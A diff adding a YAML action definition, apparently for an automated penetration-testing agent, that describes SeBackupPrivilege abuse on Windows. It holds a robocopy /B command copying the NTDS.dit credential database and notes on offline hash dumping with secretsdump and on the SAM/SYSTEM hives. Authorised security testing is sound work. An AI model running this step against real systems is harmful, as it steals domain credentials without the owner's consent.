@@ -1,0 +1,16 @@
+name: sebackup_privesc
+category: privesc
+description: SeBackupPrivilege exploitation
+preconditions:
+  - os==windows
+parameters:
+  target_ip: from_engagement.target_ip
+command_template: "robocopy /B C:\Windows\NTDS C:\temp ntds.dit"
+parser: null
+expected_effects:
+  - action_completed
+falsifier:
+  pattern: "error|failed|refused|denied"
+  timeout: 30
+model_tier: haiku
+mechanism: "SeBackupPrivilege: read any file regardless of ACL. Use robocopy /B or diskshadow for NTDS.dit, then secretsdump offline. Also works for SAM/SYSTEM hives."
